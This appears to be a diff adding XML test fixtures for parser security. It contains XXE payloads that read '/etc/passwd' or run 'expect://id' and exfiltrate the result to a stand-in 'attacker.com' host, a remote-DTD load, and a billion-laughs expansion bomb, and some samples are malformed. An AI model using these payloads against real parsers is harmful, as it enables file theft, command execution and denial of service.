@@ -1,0 +1,55 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<root>&send;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE doc [
+  <!ELEMENT doc ANY>
+  <!ATTLIST doc id ID #REQUIRED>
+  <!ENTITY internal "value">
+  <!ENTITY external SYSTEM "file:///dev/null">
+]>
+<doc id="test1">
+  <nested attr="&internal;">
+    <deep>&external;</deep>
+  </nested>
+</doc>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root SYSTEM "http://malicious.com/schema.dtd">
+<root>
+  <item>test</item>
+  <![CDATA[<fake>content</fake>]]>
+  <comment><!-- nested <!-- comment --> --></comment>
+</root>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<bomb>&lol4;</bomb>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "expect://id">
+  <!ENTITY % payload "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%xxe;'>">
+  %payload;
+]>
+<root>&exfiltrate;</root>
+```
